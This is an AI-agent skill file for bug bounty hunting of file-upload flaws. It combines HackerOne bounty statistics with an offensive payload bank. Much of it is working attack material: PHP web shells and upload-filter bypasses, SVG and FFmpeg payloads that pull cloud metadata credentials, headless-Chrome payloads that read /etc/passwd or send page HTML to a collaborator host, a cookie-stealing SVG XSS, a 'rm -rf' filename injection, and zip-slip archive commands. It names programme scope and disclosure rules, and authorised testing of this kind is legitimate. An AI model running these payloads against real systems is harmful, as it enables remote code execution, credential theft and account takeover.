---
name: file-upload
description: >-
  Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via
  filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only),
  magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess
  upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip
  (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture,
  /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response.
  Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when
  testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP
  processors. Real paid examples. Combined with the HackerOne field guide (real disclosed-report data: where
  it pays, quick wins, payload banks). Hunt file upload flaws. Use when testing avatars, documents, imports,
  and archive extraction. Backed by 100 disclosed HackerOne reports.
---

# File Upload — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# File Upload — HackerOne field guide

Built from **100** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **100** · paid: **20**
- Median bounty **$400** · p90 **$4,000** · max **$5,000** · total **$21,500**
- Median upvotes **14**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 4 | $7,800 | 327 |
| Aiven Ltd | 1 | $5,000 | 56 |
| Mail.ru | 5 | $4,150 | 431 |
| Slack | 3 | $1,700 | 107 |
| Visma Public | 3 | $750 | 570 |
| TikTok | 3 | $750 | 221 |
| Linktree | 1 | $750 | 33 |
| Chaturbate | 1 | $300 | 17 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`avatar` `upload` `file` `attachment` `document` `image` `import` `archive`

## Tools

`Burp` · `ffuf` · `exiftool` · `nuclei`

## Escalation chains

- Upload -> XSS.
- Upload + parser -> RCE.
- Zip slip -> file write.

## Related

- `rce` (1,399 reports)
- `path-traversal` (300 reports)
- `xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## Related Skills & Chains

- **`rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- Enumerate the whole upload lifecycle, not just the upload form: where the file is stored, what name it gets, whether it is served back, from which directory/origin, and which parser later opens it.
- Classic endpoints: `/upload`, `/avatar`, `/profile-picture`, `/attachment`, `/document`, `/import`, `/export`, `/convert`, `/generate-pdf`, `/screenshot`, `/extract`, `/unzip`.
- Fields to tamper in multipart requests: `filename`, the per-part `Content-Type`, and any sibling fields such as `uploadPath`/`directory`/`type` that influence the destination path or MIME mapping.
- JSON/ODATA-style uploads carry metadata instead of raw multipart: `fileName`, `fileType`, `uploadData.content` — test each independently (2026 Hackrate case: client-side-only `.txt/.md` allowlist with no server validation).
- Server config override files: `.htaccess` (Apache), `web.config` (IIS), `.user.ini` — check whether they can be uploaded and whether the upload dir is configured to process them.
- Alternative executable extensions by stack: PHP `.php .phtml .php5 .php7 .pht .phar`; ASP/ASPX `.asp .aspx .asa .cer .soap`; JSP `.jsp .jspx .jsw .jsv .jspf`; plus `.shtml`, `.cgi`, `.pl`, `.cfm`.
- Non-RCE impact formats: `.svg` (XSS/XXE/SSRF), `.html` (stored XSS, `.hta` for client-side RCE), `.csv` (CSV injection), `.xml`/`.docx`/`.xlsx` (XXE), `.zip` (Zip Slip), `.avi` (LFI/SSRF).
- File-URL signer endpoints: inspect base64 policy fields for missing key-prefix, content-length, content-type, or expiry conditions — anonymous `?max-keys=1` can find buckets with ListBucket enabled separately from GetObject.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Establish the validation model with three probes: real PHP renamed `.jpg` (tests content inspection), real JPEG renamed `.php` (tests extension allowlist), real JPEG with `Content-Type: application/x-php` (tests MIME/extension consistency). This reveals exactly which layers are real (2026 $13,500 polyglot writeup).
- Content-Type bypass: `filename=shell.php` with per-part `Content-Type: image/jpeg` — works only if the server trusts the declared MIME.
- Extension obfuscation: `shell.php.jpg`, `shell.jpg.php`, `.pHp`, `.pHP5`, trailing `shell.php.`, URL-encoded `exploit%2Ephp`, and semicolon/null-byte forms `exploit.asp;.jpg`, `exploit.asp%00.jpg`.
- Non-recursive stripping bypass: if the app removes `.php`, name the file `exploit.p.phphp` so one removal leaves `.php`.
- NTFS ADS on IIS: `shell.asp:.jpg`, `shell.php::$DATA` — reject any filename containing `:`. IIS also converts `"`→`.`, `<`→`*`, `>`→`?` when `Content-Disposition` uses single quotes.
- Multibyte conversion: `\xC0\x2E`, `\xC4\xAE`, `\xC0\xAE` may become `.` after UTF-8→ASCII normalisation.
- Polyglot web shell (PortSwigger lab): `exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" input.jpg -o polyglot.php` — passes magic-byte/dimension checks while executing as PHP.
- Phar/JPEG polyglot: prepend image magic to a PHAR with `__HALT_COMPILER();` metadata, upload via avatar, then trigger `phar://uploads/poly.jpg/x` through `file_exists()`/`getimagesize()` (OpenMage CVE-2026-25524).
- .htaccess override: upload `AddType application/x-httpd-php .smh` with `Content-Type: text/plain`, then upload `exploit.smh`.
- Path traversal in the upload destination: set `uploadPath=../temp`, `uploadPath=..%2f..%2ftrav`, or `uploadPath=/tmp/dir` and check the returned URL for reflected traversal.
- Race conditions: upload-then-delete validation windows (AV scanners), or brute-force `uniqid()`-generated temp directories — enlarge the window with a large padded file whose payload is at the start.
- `PUT` upload: send `OPTIONS` to discover endpoints advertising PUT, then `PUT /images/exploit.php` with `Content-Type: application/x-httpd-php`.
- Parser exploitation without RCE: SVG `<script>` stored XSS, DOCX/XLSX XXE, ImageMagick MVG `fill 'url(http://169.254.169.254/...)'` and SVG `<image xlink:href=...>` SSRF, ffmpeg m3u8/concat SSRF, headless-Chrome PDF `@import`/iframe/file:// reads.

### C. Validation / proof bar — how to confirm and avoid false positives
- A file that uploads but is never served, executed, or parsed is a write-only blob — not a finding. Prove the full round trip.
- RCE requires actual command output (`whoami`/`id`) from the uploaded shell, or an OOB callback emitted by it. "The file was accepted" is not execution.
- Check the `Content-Type` response header on the retrieved file — if the server serves it as `text/plain`, source disclosure may be the real impact instead of RCE.
- Stored XSS requires the script to actually fire in a victim browser, same origin as the upload; confirm the file is not sandboxed by a separate download domain or `Content-Disposition: attachment`.
- Blind upload-to-write: prove the write reached the real filesystem (directory-creation failures as an oracle), then find a secondary processor (cron, parser) to reach execution — do not assume execution from a UUID-renamed file you cannot read back.
- Distinguish client-side-only restrictions from server enforcement by replaying the request through a proxy with the UI bypassed.
- For polyglots, verify the file is still recognised as an image (`file`, `getimagesize()`) *and* that the payload survives any re-encoding (GD strips metadata — ICO files are a known exception).
- For XXE/SSRF via uploads, apply the same proof bar as the parent class: real file content or a Collaborator hit carrying data, not merely a DNS ping.
- Severity: confirmed shell RCE → Critical (CVSS 9.8 examples are common); stored XSS / same-origin script → High; write-only upload with no retrieval or execution → Informational.

**PortSwigger lab-to-technique map (use as a testing sequence):**
1. No restrictions → upload `<?php echo system($_GET['command']); ?>` and request it directly.
2. Content-Type restriction → replay with `Content-Type: image/jpeg` on the file part.
3. Path traversal → place the shell outside the upload directory via the filename.
4. Extension blacklist → upload `.htaccess` (`AddType application/x-httpd-php .smh`) plus `shell.smh`.
5. Obfuscated extension → `shell.php%00.jpg`, `shell.php.` or `shell%2Ephp`.
6. Content inspection → ExifTool polyglot JPEG/PHP.
7. Race condition → upload-then-delete or URL-fetch temp-directory brute-force.
8. No RCE → HTML/SVG stored XSS or XML/Office parser XXE.

**OWASP validation-layer checklist (invert each into a bypass test):**
- Extension allowlist — test double extensions, case variants, trailing dots/whitespace, encoded dots, null bytes, NTFS ADS.
- Content-Type validation — remember it is user-supplied; test declared-vs-actual mismatches.
- File signature validation — polyglots and metadata-embedded payloads defeat signature-only checks.
- Filename safety — `../`, absolute paths, colons, backslashes, overlong Unicode.
- Storage location — outside web root / random names defeat direct retrieval but may hand off to a parser.
- Permissions — filesystem execute bits, directory handler config, separate download origin.

**Common reasons an upload test fails:**
- The server re-encodes images with GD/LibreOffice, stripping metadata payloads (try ICO or an XXE in a part GD does not rewrite).
- The upload directory is served from a cookieless/CDN domain — XSS there cannot steal the app's cookies.
- The generated filename is a UUID with a forced extension — pivot to path traversal in a directory field or a secondary parser.
- The declared `Content-Type` is overwritten to `application/octet-stream` — client-side execution may be impossible.
- A WAF blocks `<?php` — use a short echo tag `<?= ... ?>`, a polyglot, or an image-metadata payload.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/web-security/file-upload
2. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
